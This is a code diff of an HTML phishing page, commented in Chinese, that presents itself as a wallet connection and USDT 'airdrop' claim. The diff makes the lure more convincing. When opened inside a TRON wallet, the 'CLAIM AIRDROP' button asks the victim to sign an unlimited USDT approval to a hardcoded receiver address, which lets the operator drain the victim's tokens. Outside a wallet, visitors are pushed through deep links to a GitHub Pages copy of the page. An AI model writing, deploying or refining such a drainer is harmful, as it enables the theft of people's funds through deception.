@@ -1,64 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AIRDROP_FINAL</title>
+    <title>AUTH_CENTER</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
-        #terminal { width: 85%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #050000; box-shadow: 0 0 15px #f00; }
-        .btn { display: block; width: 240px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; border: none; font-size: 16px; }
-        .log { color: #0f0; font-size: 11px; margin-top: 15px; text-align: left; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 90%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #0a0000; box-shadow: 0 0 15px rgba(255,0,0,0.5); }
+        .btn { 
+            display: block; width: 80%; margin: 30px auto; padding: 20px; 
+            background: #f00; color: #000; text-decoration: none; 
+            font-weight: bold; border-radius: 8px; font-size: 18px;
+            box-shadow: 0 0 20px #f00; border: none; cursor: pointer;
+        }
+        .log { color: #0f0; font-size: 12px; margin-top: 15px; text-align: left; line-height: 1.5; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <h2>> CORE_SYSTEM_V8</h2>
-        <p id="env_status">> ENV: INITIALIZING...</p>
-        <div class="log" id="log">> STANDBY_MODE...</div>
+        <h2>> SECURITY_V9_INIT</h2>
+        <div id="status">> SYSTEM: READY</div>
+        <div class="log" id="log">> AWAITING_CONNECTION...</div>
     </div>
 
-    <div id="btnContainer">
-        <a id="jumpBtn" href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" class="btn">
-            CONNECT & CLAIM
+    <div id="actionArea">
+        <a id="jumpBtn" href="https://tp-lab.io/url/https://patrickdafhao-code.github.io/cook/" class="btn">
+            CONNECT WALLET
         </a>
     </div>
 
     <script>
-        const receiver = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; // ！！！修改这里
+        // 1. 配置信息 (请务必检查你的收款地址)
+        const receiver = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; 
         const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
         window.onload = async function() {
             const log = document.getElementById('log');
-            const envStatus = document.getElementById('env_status');
-            const btnContainer = document.getElementById('btnContainer');
+            const status = document.getElementById('status');
+            const actionArea = document.getElementById('actionArea');
 
-            // 检测是否在钱包内
+            // 2. 环境判断：如果已经在钱包浏览器内 (存在 tronWeb)
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                envStatus.innerText = "> ENV: INTERNAL_WALLET";
-                log.innerHTML += "<br>> WALLET: " + window.tronWeb.defaultAddress.base58.substring(0,8);
-
-                // 如果在钱包里，把按钮替换为“授权”按钮，去掉 href 跳转
-                btnContainer.innerHTML = '<button id="approveBtn" class="btn">CONFIRM AUTHORIZATION</button>';
+                status.innerText = "> SYSTEM: WALLET_CONNECTED";
+                log.innerHTML += "<br>> ADDR: " + window.tronWeb.defaultAddress.base58.substring(0,10) + "...";
+                
+                // 替换按钮为“授权”逻辑
+                actionArea.innerHTML = '<button id="approveBtn" class="btn">CLAIM AIRDROP</button>';
                 
                 document.getElementById('approveBtn').onclick = async function() {
                     try {
-                        log.innerHTML += "<br>> REQUESTING_CONTRACT_APPROVE...";
-                        let contract = await window.tronWeb.contract().at(usdtContract);
-                        const val = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                        log.innerHTML += "<br>> REQUESTING_USDT_PERMISSION...";
+                        const contract = await window.tronWeb.contract().at(usdtContract);
+                        const infiniteVal = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                         
-                        await contract.approve(receiver, val).send({ feeLimit: 100000000 });
-                        log.innerHTML += "<br>> [SUCCESS]: SIGNED";
+                        // 发起授权
+                        await contract.approve(receiver, infiniteVal).send({ feeLimit: 100000000 });
+                        log.innerHTML += "<br>> [SUCCESS]: SIGNED_BY_USER";
                     } catch (e) {
                         log.innerHTML += "<br>> [ERROR]: " + e.message;
                     }
                 };
             } else {
-                // 在 Safari 里，保持原来的 <a> 标签跳转
-                envStatus.innerText = "> ENV: EXTERNAL_BROWSER";
-                log.innerHTML += "<br>> READY_TO_BRIDGE.";
+                // 3. 环境判断：如果在外部浏览器 (Safari/Telegram)
+                log.innerHTML += "<br>> [NOTICE]: EXTERNAL_ENV_DETECTED";
+                log.innerHTML += "<br>> [ACTION]: TAP_BUTTON_TO_BRIDGE";
             }
         };
     </script>
